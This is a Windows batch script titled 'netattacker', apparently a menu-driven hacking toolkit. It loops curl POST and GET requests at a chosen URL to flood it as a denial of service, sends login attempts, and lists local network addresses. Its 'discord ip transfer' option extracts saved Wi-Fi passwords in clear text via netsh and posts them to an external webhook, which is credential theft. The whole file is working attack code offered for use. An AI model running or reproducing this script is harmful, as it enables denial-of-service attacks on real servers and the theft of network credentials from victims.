@echo off
chcp 65001 > nul
setlocal enabledelayedexpansion
title netattacker

rem setup
set /a usernamerand=%RANDOM%
set /a passwordrand=%RANDOM%
set /a notoverflow=100000000
set /a errcode=1
set /a errcode2=2
set /a errcode3=3
set /a errcode4=4
set /a errcode5=5
set /a errcode6=6
set /a errcode7=7
set /a errcode8=8
set tla1text=[93mTLA1[0m
set tla2text=[94mTLA2[0m
set gettext=[92mGET[0m
set posttext=[36mPOST[0m
set failed=[93m[-][0m
set success=[92m[+][0m
set warning=[91m[!][0m


:loading 
color a 
for /L %%a in ( 1,1,20 ) do (
cls
timeout /t 0 > nul
echo loading:%%a

)
goto main_display


:main_display
color 0f
cls
echo [32m1[0m:POST dos  [32m2[0m:GET dos [32m3[0m:more information 
echo [32m4[0m:TLA1      [32m5[0m:TLA2    [32m6[0m:check ip
echo [32m7[0m:sniff     [32m8[0m:discord ip transfer
echo.
choice /c:12345678 /n /m ">"

if %errorlevel% EQU %errcode% ( goto post )
if %errorlevel% EQU %errcode2% ( goto get )
if %errorlevel% EQU %errcode3% ( goto getinformation )
if %errorlevel% EQU %errcode4% ( goto TLA1 )
if %errorlevel% EQU %errcode5% ( goto TLA2 )
if %errorlevel% EQU %errcode6% ( goto ipchecker )
if %errorlevel% EQU %errcode7% ( goto sniff )
if %errorlevel% EQU %errcode8% ( goto discord_ip )


:post
cls
set /p url="url:"
:subpost
for /L %%a in ( 1,1,%notoverflow% ) do ( 

call :post_dos 

)
echo url unknown %failed%
echo press enter to back to main_display
pause > nul
goto main_display

:post_dos
curl -X POST "%url%" -d "username=%usernamerand%&password=%passwordrand%"
set /a usernamerand=%usernamerand%+1
set /a passwordrand=%passwordrand%+1
goto subpost


:get
cls
set /p url="url:"
:subget
for /L %%a in ( 1,1,%notoverflow% ) do ( 

call :get_dos 

)
echo url unknown %failed%
echo press enter to back to main_display
pause > nul
goto main_display

:get_dos
curl -X GET "%url%" -d "username=%usernamerand%&password=%passwordrand%"
set /a usernamerand=%usernamerand%+1 
set /a passwordrand=%passwordrand%+1
goto subget


:TLA1
set /p username="username:"
set /p password="password:"
set /p url="url:"
curl -X POST "%url%" -d "username=%username%&password=%password%"
echo.
echo press ENTER to back to main_display
pause > nul
goto main_display


:TLA2
set /p username="username:"
set /p password="password:"
set /p url="url:"
curl -X GET "%url%" -d "username=%username%&password=%password%"
echo.
echo press ENTER to back to main_display
pause > nul
goto main_display


:getinformation
cls
echo %gettext% dos:do a multiple requests of GET, on server/host specified
echo %posttext% dos:do a multiple requests of POST, on server/host specified
echo %tla1text%(Terminal Login Access):allow to do a login request on server/host specified in POST mode
echo %tla2text%(Terminal Login Access):allow to do a login request on server/host specified in GET mode
echo.
echo.
echo press ENTER to back to main_display
pause > nul
goto main_display


:ipchecker
cls
ipconfig /all | find "IPv4"

for /f %%a in ( 'arp -a ^| find "1"' ) do ( 
echo %%a %success%
)
echo.
echo press ENTER to back to main_display
pause > nul
goto main_display


:sniff
runas /user:%username% cmd "netstat -nbf | find "TCP" "
pause > nul
goto main_display


:discord_ip
for /f "tokens=2,3 delims=:" %%a in ( 'netsh wlan show profiles' ) do (
set name=%%a 
)
netsh wlan show profiles %name% key=clear | find "Key Content" > wifi.txt

set /p "var=" < wifi.txt
set webhook="our webhook"
for /L %%a in (1,1,1) do ( 

curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"%var%\"}" %webhook%

)
del wifi.txt
echo message sendend %success%
echo press ENTER to back to main_display
pause > nul
goto main_display